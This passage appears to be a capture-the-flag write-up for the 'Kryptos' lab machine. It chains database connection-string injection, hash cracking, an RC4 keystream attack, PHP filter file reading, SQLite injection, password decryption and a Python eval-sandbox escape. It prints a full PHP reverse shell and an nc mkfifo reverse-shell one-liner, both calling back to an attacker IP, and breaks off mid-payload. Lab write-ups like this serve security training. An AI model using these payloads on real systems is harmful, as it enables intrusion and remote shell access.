@@ -1,0 +1,646 @@
+I",v<p><em>Write-up by Michele Campobasso <a href="https://twitter.com/iswearimnotalu2">@iswearimnotalu2</a></em></p>
+
+<h1 id="user">USER</h1>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<h3 id="nmap">NMAP</h3>
+
+<p>We start from a comprehensive scan with <strong>Nmap</strong>:</p>
+
+<pre>root@pentestbox:~# nmap -sV -sC -sS -p- 10.10.10.129 -A
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-27 13:13 CEST
+Nmap scan report for kryptos.htb (10.10.10.129)
+Host is up (0.043s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+<b>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</b>
+| ssh-hostkey: 
+|   2048 2c:b3:7e:10:fa:91:f3:6c:4a:cc:d7:f4:88:0f:08:90 (RSA)
+|   256 0c:cd:47:2b:96:a2:50:5e:99:bf:bd:d0:de:05:5d:ed (ECDSA)
+|_  256 e6:5a:cb:c8:dc:be:06:04:cf:db:3a:96:e7:5a:d5:aa (ED25519)
+<b>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</b>
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Cryptor Login
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=9/27%OT=22%CT=1%CU=35711%PV=Y%DS=2%DC=T%G=Y%TM=5D8DEEF
+OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)SEQ
+OS:(SP=108%GCD=1%ISR=108%TI=Z%II=I%TS=A)OPS(O1=M54BST11NW7%O2=M54BST11NW7%O
+OS:3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1=7120%W2=
+OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSN
+OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 110/tcp)
+HOP RTT      ADDRESS
+1   30.50 ms 10.10.16.1
+2   15.71 ms kryptos.htb (10.10.10.129)</pre>
+
+<p>From this, it is possible to see that there’s two services exposed, <strong>ssh</strong> and a <strong>webserver</strong>. Since we don’t own any credential for ssh yet, we’ll explore the webserver first.</p>
+
+<h3 id="dirbuster">DirBuster</h3>
+
+<p>By quickly visiting the HTTP server, we face a login page. First, we try to gather more information by finding pages available on such webserver through <strong>DirBuster</strong>. We can use a lowercase wordlist such as <code>/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code> because Apache is case insensitive.</p>
+
+<p><img src="./images/kryptos/dirbuster.png" alt="" /></p>
+
+<p>Results are shown below:</p>
+
+<pre><code>/index.php		---&gt;	200
+/server-status/	---&gt;	403
+/icons/		---&gt;	403
+/icons/small/	---&gt;	403
+/cgi-bin/		---&gt;	403
+/dev/			---&gt;	403
+/encrypt.php 	---&gt;	redirects to /index.php
+/decrypt.php 	---&gt;	redirects to /index.php
+/logout.php 		---&gt;	redirects to /index.php
+/url.php 		---&gt;	200 - empty page
+/aes.php 		---&gt;	200 - empty page
+/rc4.php 		---&gt;	200 - empty page
+</code></pre>
+
+<h2 id="login-bypass">Login bypass</h2>
+
+<p>By inspecting the source code of <code>index.php</code>, it is possible to see that there are two hidden fields:</p>
+
+<ol>
+  <li><strong>db</strong>, which contains the value <em>cryptor</em>;</li>
+  <li><strong>token</strong>, which contains an anti-XSRF token that changes to each refresh.</li>
+</ol>
+
+<p>By modifying the value of db and putting something arbitrary, we get an error message:</p>
+
+<pre><b>PDOException code: 1044</b></pre>
+
+<p>This error tells us that the database driver used is <strong>PDO</strong> and this input takes part to the construction of the connection string to the DB. We could find something similar to <a href="https://www.php.net/manual/en/pdo.construct.php">this</a>:</p>
+
+<pre>/* Connect to a MySQL database using driver invocation */
+$dsn = 'mysql:dbname=cryptos';</pre>
+
+<p>but we would like to obtain</p>
+
+<pre>$dsn = 'mysql:dbname=cryptos<b>;host=pentest_box_ip_address_here</b>';</pre>
+
+<p>Therefore, we have to modify <strong>db</strong> accordingly:</p>
+
+<pre><code>cryptos -&gt; cryptos;host=10.10.16.44	
+</code></pre>
+
+<h2 id="database-poisoning">Database Poisoning</h2>
+
+<p>We have to provide a fake server to allow the remote host to authenticate against us. <a href="https://github.com/skelsec/Responder3">Responder3</a> comes in help:</p>
+
+<pre><code>root@pentestbox:~# python3 ./Responder3.py -I tun0 -4 -6 -p examples/config_test.py
+</code></pre>
+
+<p>The provided parameters represent:</p>
+
+<ul>
+  <li><strong>-p examples/config_test.py</strong> — Configuration file (Python).</li>
+  <li><strong>-I tun0</strong> — Interface to bind to.</li>
+  <li><strong>-4</strong> — IP version 4 to be used.</li>
+  <li><strong>-6</strong> — IP version 6 to be used.</li>
+</ul>
+
+<p>Let’s then login with random credentials and:</p>
+
+<p><img src="./images/kryptos/responder.png" alt="" /></p>
+
+<pre><code>$mysqlna$4141414141414141414141414141414141414141*b25658e4107b15ab804df5d06e47ee40a97f2a53
+</code></pre>
+
+<p>In this string, we do have the hashing algorithm used (<em>mysqlna</em>), the salt and the salted hash of the password used to login against the DB. With John the Ripper, it is possible to crack it. Lets put first the string obtained into a file, then run John:</p>
+
+<pre><code>root@pentestbox:~# echo "$mysqlna$4141414141414141414141414141414141414141*b25658e4107b15ab804df5d06e47ee40a97f2a53" &gt; hashedpass
+root@pentestbox:~# john --wordlist --format=mysqlna /usr/share/wordlists/rockyou.txt hashedpass
+Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (mysqlna, MySQL Network Authentication [SHA1 32/64])
+krypt0n1te            (root)
+guesses: 1  time: 0:00:03:21 DONE (Fri Sep 27 06:47:58 2019)  c/s: 300  trying: pt0n1te
+Use the "--show" option to display all of the cracked passwords reliably
+
+root@pentestbox:~# john --show hashedpass
+?:krypt0n1te
+
+1 password hash cracked, 0 left
+</code></pre>
+
+<p>By trying some combinations with default users as login, we can’t get still to login. Therefore, we have to figure out how to enable us to bypass the login page. A path could be to poison the page and force a login against a local database and creating a fake account. In addition, we want to be able to understand what the victim is expecting from a DB, so we have to log all the errors that will be generated during the attempts.</p>
+
+<p>First, we have to create a local MySQL Server. Let’s add then to <code>/etc/mysql/my.cnf</code> the following code:</p>
+
+<pre><code>[mysqld]
+bind-address = 0.0.0.0
+general-log             = 1
+general_log_file        = /var/log/mysql/mysql.log	
+</code></pre>
+
+<p>By doing so, we can create an active instance of MySQL listening on our machine and we can build the inner structure of the DB accordingly to what is required. Let’s then start the service and read the logs:</p>
+
+<pre><code>root@pentestbox:~# service mysql start
+root@pentestbox:~# tail -f /var/log/mysql/mysql.log
+</code></pre>
+
+<p>Trigger again the login:</p>
+
+<pre><code>Access denied for user 'dbuser'@'kryptos.htb' (using password: YES)
+</code></pre>
+
+<p>We do know now the user, so we create both the user and the database <strong>cryptor</strong>, which we already know:</p>
+
+<pre><code>root@pentestbox:~# mysql -u root -p  
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 55
+Server version: 10.3.15-MariaDB-1-log Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]&gt; CREATE USER 'dbuser'@'10.10.10.129' IDENTIFIED BY 'krypt0n1te';
+Query OK, 0 rows affected (0.001 sec)
+
+MariaDB [(none)]&gt; GRANT ALL ON *.* TO 'dbuser'@'10.10.10.129';
+Query OK, 0 rows affected (0.001 sec)
+
+MariaDB [(none)]&gt; FLUSH PRIVILEGES;
+Query OK, 0 rows affected (0.001 sec)
+
+MariaDB [(none)]&gt; CREATE DATABASE cryptor;
+Query OK, 1 row affected (0.000 sec)
+</code></pre>
+
+<p>Trigger again the login with credentials <code>attacker:password</code> and we get the query:</p>
+
+<pre><code>SELECT username, password FROM users WHERE username='attacker' AND password='5f4dcc3b5aa765d61d8327deb882cf99'
+</code></pre>
+
+<p>So, the backend expects to have a table <em>users</em> with two fields, <em>username</em> and <em>password</em>. Let’s create them then:</p>
+
+<pre><code>MariaDB [(none)]&gt; USE cryptor
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+
+MariaDB [cryptor]&gt; CREATE TABLE users ( username VARCHAR(255), password VARCHAR(255) );
+Query OK, 0 rows affected (0.181 sec)
+
+MariaDB [cryptor]&gt; INSERT INTO users ( username, password ) VALUES ( 'attacker', '5f4dcc3b5aa765d61d8327deb882cf99' );
+Query OK, 1 row affected (0.032 sec)
+</code></pre>
+
+<p>In this way, we have managed to login successfully.</p>
+
+<p><img src="./images/kryptos/loginbypassed.png" alt="" /></p>
+
+<h2 id="weak-encryption">Weak encryption</h2>
+
+<p>The webservice we find is a tool that allows us to encrypt files with two stream cyphers, AES-CBC and <strong>RC4</strong>. The decryption part is still under construction. RC4 is vulnerable to <a href="https://crypto.stackexchange.com/questions/45021/rc4-finding-key-if-we-know-plain-text-and-ciphertext">known-cleartext attacks</a> under the condition in which the keystream generated has always the same initialization vector.</p>
+
+<p>The logic behind the attack can be summed up in the following steps:</p>
+
+<ol>
+  <li>Feed the cryptosystem with a known input (a file with a long sequence of <code>a</code>);</li>
+  <li>
+    <p>Obtain the encrypted content:</p>
+
+    <p><code>ZFab8VZUIV5qu5rKj1SWoME9ZBewRadWNQ4YR9dM/657ZSgW9mfb4h2q32cxgq1+M67NnqRzOMvibBdA9jHboYr6oC+fzHibzR903NzgQBTbcJMhLkhQPRkVpQheiyKIY0NIhL1gwSXAlLTsXxtTDF/RmUlTRvdraDyTHEb0slCruyQ+DUxVMbjR/wmRfZcjP0l8t4XKSdOulLrHZskwsku1mIupShlgyyaRsvWXlbRbU32t4wMYrN7AZWTihxwSmNd+yaGQm9sqwV6Z9T+WPVdaxTVCv0SDmrGEfyjCJ1cXcnL86GLY4Tc=</code></p>
+  </li>
+  <li>
+    <p>Obtain the bytes of such message (de-base64, bytes, trim unwanted content from xxd):</p>
+
+    <pre><code> root@pentestbox:~# echo "ZFab8VZUIV5qu5rKj1SWoME9ZBewRadWNQ4YR9dM/657ZSgW9mfb4h2q32cxgq1+M67NnqRzOMvibBdA9jHboYr6oC+fzHibzR903NzgQBTbcJMhLkhQPRkVpQheiyKIY0NIhL1gwSXAlLTsXxtTDF/RmUlTRvdraDyTHEb0slCruyQ+DUxVMbjR/wmRfZcjP0l8t4XKSdOulLrHZskwsku1mIupShlgyyaRsvWXlbRbU32t4wMYrN7AZWTihxwSmNd+yaGQm9sqwV6Z9T+WPVdaxTVCv0SDmrGEfyjCJ1cXcnL86GLY4Tc=" | base64 -d | xxd -b | sed -e 's/^[^:]*:[[:space:]][[:space:]]*//' -e 's/[[:space:]][[:space:]]*.\{6,6\}$//'
+
+ 01100100 01010110 10011011 11110001 01010110 01010100
+ 00100001 01011110 01101010 10111011 10011010 11001010
+ 10001111 01010100 10010110 10100000 11000001 00111101
+ 01100100 00010111 10110000 01000101 10100111 01010110
+ 00110101 00001110 00011000 01000111 11010111 01001100
+ 11111111 10101110 01111011 01100101 00101000 00010110
+ 11110110 01100111 11011011 11100010 00011101 10101010
+ 11011111 01100111 00110001 10000010 10101101 01111110
+ 00110011 10101110 11001101 10011110 10100100 01110011
+ 00111000 11001011 11100010 01101100 00010111 01000000
+ 11110110 00110001 11011011 10100001 10001010 11111010
+ 10100000 00101111 10011111 11001100 01111000 10011011
+ 11001101 00011111 01110100 11011100 11011100 11100000
+ 01000000 00010100 11011011 01110000 10010011 00100001
+ 00101110 01001000 01010000 00111101 00011001 00010101
+ 10100101 00001000 01011110 10001011 00100010 10001000
+ 01100011 01000011 01001000 10000100 10111101 01100000
+ 11000001 00100101 11000000 10010100 10110100 11101100
+ 01011111 00011011 01010011 00001100 01011111 11010001
+ 10011001 01001001 01010011 01000110 11110111 01101011
+ 01101000 00111100 10010011 00011100 01000110 11110100
+ 10110010 01010000 10101011 10111011 00100100 00111110
+ 00001101 01001100 01010101 00110001 10111000 11010001
+ 11111111 00001001 10010001 01111101 10010111 00100011
+ 00111111 01001001 01111100 10110111 10000101 11001010
+ 01001001 11010011 10101110 10010100 10111010 11000111
+ 01100110 11001001 00110000 10110010 01001011 10110101
+ 10011000 10001011 10101001 01001010 00011001 01100000
+ 11001011 00100110 10010001 10110010 11110101 10010111
+ 10010101 10110100 01011011 01010011 01111101 10101101
+ 11100011 00000011 00011000 10101100 11011110 11000000
+ 01100101 01100100 11100010 10000111 00011100 00010010
+ 10011000 11010111 01111110 11001001 10100001 10010000
+ 10011011 11011011 00101010 11000001 01011110 10011001
+ 11110101 00111111 10010110 00111101 01010111 01011010
+ 11000101 00110101 01000010 10111111 01000100 10000011
+ 10011010 10110001 10000100 01111111 00101000 11000010
+ 00100111 01010111 00010111 01110010 01110010 11111100
+ 11101000 01100010 11011000 11100001 00110111
+</code></pre>
+  </li>
+  <li>Bitwise XOR the cleartext and the encrypted content to obtain the keystream <a href="xor.pw">xor.pw</a>;</li>
+  <li>Bitwise XOR the secret encrypted content and the keystream to obtain the secret content in cleartext.</li>
+</ol>
+
+<p>The process has been scripted into <a href="./resources/kryptos/break_rc4.py">break_rc4.py</a>.</p>
+
+<p>As suggested in the page itself, it is possible to ask for resources via the HTTP protocol. So, we can try to see some of the 403 files and directories we had before. One of the paths to be explored is for sure <code>/dev/</code>. By requiring <code>http://127.0.0.1/dev/</code>, we obtain the RC4 encrypted stream, decrypt it and we get:</p>
+
+<pre><code>&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="menu"&gt; &lt;a href="index.php"&gt;Main Page&lt;/a&gt; &lt;a href="index.php?view=about"&gt;About&lt;/a&gt; &lt;a href="index.php?view=todo"&gt;ToDo&lt;/a&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;
+</code></pre>
+
+<p>Looks interesting. Let’s dig in more requiring <code>http://127.0.0.1/dev/index.php?view=todo</code></p>
+
+<pre><code>&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="menu"&gt; &lt;a href="index.php"&gt;Main Page&lt;/a&gt; &lt;a href="index.php?view=about"&gt;About&lt;/a&gt; &lt;a href="index.php?view=todo"&gt;ToDo&lt;/a&gt; &lt;/div&gt; &lt;h3&gt;ToDo List:&lt;/h3&gt; 1) Remove sqlite_test_page.php &lt;br&gt;2) Remove world writable folder which was used for sqlite testing &lt;br&gt;3) Do the needful &lt;h3&gt; Done: &lt;/h3&gt; 1) Restrict access to /dev &lt;br&gt;2) Disable dangerous PHP functions &lt;/body&gt; &lt;/html&gt;
+</code></pre>
+
+<p>Requiring <code>http://127.0.0.1/dev/sqlite_test_page.php</code> we get an empty page. Also <code>http://127.0.0.1/dev/index.php?view=about</code> doesn’t provide any valuable content.</p>
+
+<p>The presence of <code>view</code> parameter in the url may suggest a possible PHP Filter Injection:</p>
+
+<pre><code>python break_rc4.py eddqibhqbncraed6im1218elh9 /dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page
+</code></pre>
+
+<p>The first parameter after the filename is the <code>PHPSESSID</code>.
+We do get:</p>
+
+<pre><code>&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+$no_results = $_GET['no_results'];
+$bookid = $_GET['bookid'];
+$query = "SELECT * FROM books WHERE id=".$bookid;
+if (isset($bookid)) {
+   class MyDB extends SQLite3
+   {
+      function __construct()
+      {
+     // This folder is world writable - to be able to create/modify databases from PHP code
+         $this-&gt;open('d9e28afcf0b274a5e0542abb67db0784/books.db');
+      }
+   }
+   $db = new MyDB();
+   if(!$db){
+      echo $db-&gt;lastErrorMsg();
+   } else {
+      echo "Opened database successfully\n";
+   }
+   echo "Query : ".$query."\n";
+
+if (isset($no_results)) {
+   $ret = $db-&gt;exec($query);
+   if($ret==FALSE)
+    {
+    echo "Error : ".$db-&gt;lastErrorMsg();
+    }
+}
+else
+{
+   $ret = $db-&gt;query($query);
+   while($row = $ret-&gt;fetchArray(SQLITE3_ASSOC) ){
+      echo "Name = ". $row['name'] . "\n";
+   }
+   if($ret==FALSE)
+    {
+    echo "Error : ".$db-&gt;lastErrorMsg();
+    }
+   $db-&gt;close();
+}
+}
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<h2 id="sqlite-stacked-sql-injection">SQLite Stacked SQL Injection</h2>
+
+<p>In this file, it is written that the folder <code>d9e28afcf0b274a5e0542abb67db0784</code> is world-writable. More important, the param <code>$query</code> is not sanitized and could allow a Stacked SQL Injection. The database is a SQLite, so we could create a database file with some PHP inside. After some attempts, it looks impossible to run <code>system</code>, <code>shell</code>, <code>systemshell</code>, <code>popen</code> and <code>exec</code> commands.</p>
+
+<p>The payload therefore for the injection has to be something like this:</p>
+
+<pre><code>ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS db; CREATE TABLE db.table (field TEXT); INSERT INTO db.table (field) VALUES (&lt;?php'$s=fsockopen("10.10.16.44",9119);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;?&gt;');-- 
+</code></pre>
+
+<p>While the request has to be something like this:</p>
+
+<pre>/dev/sqlite_test_page.php?no_results=0&amp;bookid=1<b>;</b></pre>
+
+<p>The whole payload has to be constructed like this:</p>
+
+<pre><code>{REQUEST_URL_ENCODED}{PAYLOAD_DOUBLE_URL_ENCODED}
+</code></pre>
+
+<p>We run then the SQLInjection against our target:</p>
+
+<pre><code>root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis {REQUEST_HERE_ENCODED}{PAYLOAD_HERE_DOUBLE_ENCODED}
+&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+Opened database successfully
+Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS d; CREATE TABLE d.p (pp TEXT); INSERT INTO d.p (pp) VALUES ('&lt;?php set_time_limit(0);$i="10.10.16.9";$p=91;$cs=1400;$sh="/bin/sh -i";$d=null;$e=null;$s=fsockopen($i,$p,$en,$es,30);$ds=array(0=&gt;array("pipe","r"),1=&gt;array("pipe","w"),2=&gt;array("pipe","w"));$pr=proc_open($sh,$ds,$pp);if(!is_resource($pr)){exit(1);}stream_set_blocking($pp[0],0);stream_set_blocking($pp[1],0);stream_set_blocking($pp[2],0);stream_set_blocking($s,0);while(1){if(feof($s)){break;}if(feof($pp[1])){break;}$r=array($s,$pp[1],$pp[2]);$n=stream_select($r,$d,$e,null);if(in_array($s,$r)){$in=fread($s,$cs);fwrite($pp[0],$in);}if(in_array($pp[1],$r)){$in=fread($pp[1],$cs);fwrite($s,$in);}if(in_array($pp[2],$r)){$in=fread($pp[2],$cs);fwrite($s,$in);}}fclose($s);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($pr); ?&gt;');-- 
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>We prepare the listener on the attacker machine and we run the script to open the created file. On two different shells:</p>
+
+<pre><code>root@pentestbox:~# nc -lnvp 9119
+listening on [any] 9119 ...
+
+root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis /dev/d9e28afcf0b274a5e0542abb67db0784/db.php
+</code></pre>
+
+<p>Nonetheless, it look like that <strong>nc</strong> dies instantly as the connection is created. Therefore, it looks necessary to use another shell. For this purpose, we have chosen the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentest Monkey’s PHP Reverse Shell</a>, but it has been reduced in size by suppressing comments, shortening names and removing unnecessary features:</p>
+
+<pre><code>&lt;?php set_time_limit(0);$i="10.10.16.9";$p=9119;$cs=1400;$sh="/bin/sh -i";$d=null;$e=null;$s=fsockopen($i,$p,$en,$es,30);$ds=array(0=&gt;array("pipe","r"),1=&gt;array("pipe","w"),2=&gt;array("pipe","w"));$pr=proc_open($sh,$ds,$pp);if(!is_resource($pr)){exit(1);}stream_set_blocking($pp[0],0);stream_set_blocking($pp[1],0);stream_set_blocking($pp[2],0);stream_set_blocking($s,0);while(1){if(feof($s)){break;}if(feof($pp[1])){break;}$r=array($s,$pp[1],$pp[2]);$n=stream_select($r,$d,$e,null);if(in_array($s,$r)){$in=fread($s,$cs);fwrite($pp[0],$in);}if(in_array($pp[1],$r)){$in=fread($pp[1],$cs);fwrite($s,$in);}if(in_array($pp[2],$r)){$in=fread($pp[2],$cs);fwrite($s,$in);}}fclose($s);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($pr); ?&gt;
+</code></pre>
+
+<p>Again, lets run both nc and our script:</p>
+
+<pre><code>root@pentestbox:~# nc -lnvp 9119
+listening on [any] 9119 ...
+
+root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis {REQUEST_HERE_ENCODED}{PAYLOAD_HERE_DOUBLE_ENCODED}
+</code></pre>
+
+<p>Then, let’s call the created page:</p>
+
+<pre><code>root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis /dev/d9e28afcf0b274a5e0542abb67db0784/db.php
+
+root@pentestbox:~# nc -lnvp 9119
+listening on [any] 9119 ...
+connect to [10.10.16.9] from (UNKNOWN) [10.10.10.129] 38780
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+</code></pre>
+
+<h2 id="privilege-escalation-to-user-rijndael">Privilege escalation to user <em>rijndael</em></h2>
+
+<p>From a first look in the file system, it is possible to see that the path <code>/home/rijndael/</code> is world-readable. Inside of it, there are a few interesting things:</p>
+
+<pre><code>$ ls -la
+...
+-rw-rw-r-- 1 root     root       21 Oct 30  2018 creds.old
+-rw-rw-r-- 1 root     root       54 Oct 30  2018 creds.txt
+drwx------ 2 rijndael rijndael 4096 Mar 13  2019 kryptos
+-r-------- 1 rijndael rijndael   33 Oct 30  2018 user.txt
+$ cat creds.old
+rijndael / Password1
+$ cat creds.txt
+VimCrypt~02!
+�vnd]�K�yYC}�5�6gMRA�n$ -�
+</code></pre>
+
+<p><code>creds.txt</code> is a VimCrypt02 file. This file has been encrypted with Blowfish, which is a block-cypher vulnerable from plain-text attacks as well. The file <code>creds.old</code> makes us suspect that <code>creds.txt</code> has the same structure, so we could know the first part of it, <code>rijndael /</code>.</p>
+
+<p>We can try to crack it. By Googling, we found <a href="https://github.com/gertjanvanzwieten/vimdecrypt">vimdecrypt</a>, which fails for our purpose. Nonetheless, from the source file, we can learn more about the structure of VimCrypt02:</p>
+
+<pre><code>salt = data[0:8]
+iv = data[8:16]
+data = data[16:]
+</code></pre>
+
+<p>Since we know the inner structure of the encrypted file, then we can proceed to build our <a href="./resources/kryptos/crack_blowfish.py">cracker</a>.</p>
+
+<pre><code>rijndael / bkVBL8Q9HuBSpj
+</code></pre>
+
+<p>Let’s try then these credentials with SSH:</p>
+
+<pre><code>root@pentestbox:~# ssh rijndael@10.10.10.129 
+rijndael@10.10.10.129's password: 
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Wed Mar 13 12:31:55 2019 from 192.168.107.1
+rijndael@kryptos:~$ 
+</code></pre>
+
+<h1 id="root">ROOT</h1>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Inside of the home of rijndael, we found a script called <a href="./resources/kryptos/kryptos.py"><code>kryptos.py</code></a>:</p>
+
+<pre><code>import random 
+import json
+import hashlib
+import binascii
+from ecdsa import VerifyingKey, SigningKey, NIST384p
+from bottle import route, run, request, debug
+from bottle import hook
+from bottle import response as resp
+
+def secure_rng(seed): 
+    # Taken from the internet - probably secure
+    p = 2147483647
+    g = 2255412
+
+    keyLength = 32
+    ret = 0
+    ths = round((p-1)/2)
+    for i in range(keyLength*8):
+        seed = pow(g,seed,p)
+        if seed &gt; ths:
+            ret += 2**i
+    return ret
+
+# Set up the keys
+seed = random.getrandbits(128)
+rand = secure_rng(seed) + 1
+sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
+vk = sk.get_verifying_key()
+
+def verify(msg, sig):
+    try:
+        return vk.verify(binascii.unhexlify(sig), msg)
+    except:
+        return False
+
+def sign(msg):
+    return binascii.hexlify(sk.sign(msg))
+
+print "Seed: " + str(seed)
+print "Rand:" + str(rand)
+print "SK: " + str(sk.privkey)
+
+@route('/', method='GET')
+def web_root():
+    response = {'response':
+                {
+                    'Application': 'Kryptos Test Web Server',
+                    'Status': 'running'
+                }
+                }
+    return json.dumps(response, sort_keys=True, indent=2)
+
+@route('/eval', method='POST')
+def evaluate():
+    try: 
+        req_data = request.json
+        print req_data
+        expr = req_data['expr']
+        sig = req_data['sig']
+        # Only signed expressions will be evaluated
+        if not verify(str.encode(expr), str.encode(sig)):
+            return "Bad signature"
+        result = eval(expr, {'__builtins__':None}) # Builtins are removed, this should be pretty safe
+        response = {'response':
+                    {
+                        'Expression': expr,
+                        'Result': str(result) 
+                    }
+                    }
+        return json.dumps(response, sort_keys=True, indent=2)
+    except:
+        return "Error"
+
+# Generate a sample expression and signature for debugging purposes
+@route('/debug', method='GET')
+def debug():
+    expr = '2+2'
+    sig = sign(str.encode(expr))
+    response = {'response':
+                {
+                    'Expression': expr,
+                    'Signature': sig.decode() 
+                }
+                }
+    return json.dumps(response, sort_keys=True, indent=2)
+
+run(host='127.0.0.1', port=81, reloader=True)
+</code></pre>
+
+<p>On the last row, it sets up a server on port 81. By checking with <code>netstat</code>, we got a confirmation:</p>
+
+<pre><code>rijndael@kryptos:~$ netstat -ntlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+rijndael@kryptos:~$ 
+</code></pre>
+
+<p>To allow more extensive tests, we download the script in local and forward port 81 on our attacker machine:</p>
+
+<pre><code>root@pentestbox:~# ssh -N -f -L 81:127.0.0.1:81 rijndael@10.10.10.129
+</code></pre>
+
+<p>In the source code, it is possible to see that there are three APIs exposed:</p>
+
+<ul>
+  <li><code>GET /</code> which don’t produce valuable output;</li>
+  <li><code>GET /debug</code> which produces a signature from a sample expression;</li>
+  <li><code>POST /eval</code> which allows us to pass an expression and its signature, to evaluate the signature first and if matches, executes it.</li>
+</ul>
+
+<p>This will be our attack vector. First, we have to understand how to generate valid signatures for a given expression and second we have to find a way to execute code. By inspecting the code, it is written that the function <code>secure_rng(seed)</code> should be secure. By Googling, we found out that the <code>random.getrandbits(int)</code> function <a href="https://docs.python.org/2/library/random.html">is not good for security purposes</a>. Therefore, we try to break the <code>secure_rng(seed)</code> function:</p>
+
+<pre><code>for i in range(0,2000): 
+    # Set up the keys
+    seed = random.getrandbits(128)
+    rand = secure_rng(seed) + 1
+    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
+    vk = sk.get_verifying_key()
+    req_data = { 'expr': '2+2', 'sig': sign(str.encode('2+2')) }
+    r = requests.post("http://127.0.0.1:81/eval", json=req_data)
+    if "Bad signature" in r.text:
+        print "Seed not found yet..."
+    else:
+        print "Seed found!"
+        print seed
+        break
+</code></pre>
+
+<p>After some minutes, we get the seed:</p>
+
+<pre><code>...
+Seed not found yet...
+Seed not found yet...
+Seed not found yet...
+Seed found!
+41205234917818974876430183060164741391
+root@pentestbox:~# 
+</code></pre>
+
+<p>We have to create now a proper payload for our attack.</p>
+
+<p>In the source code, it is possible to see that <code>builtins</code> are disabled. By Googling, we find out <a href="https://stackoverflow.com/questions/35804961/python-eval-is-it-still-dangerous-if-i-disable-builtins-and-attribute-access">how to bypass this countermeasure</a> and <a href="https://www.floyd.ch/?p=584">how to run actual code</a>. We build our payload accordingly:</p>
+
+<pre><code>[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('" + "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.9 9119 &gt;/tmp/f" + "')
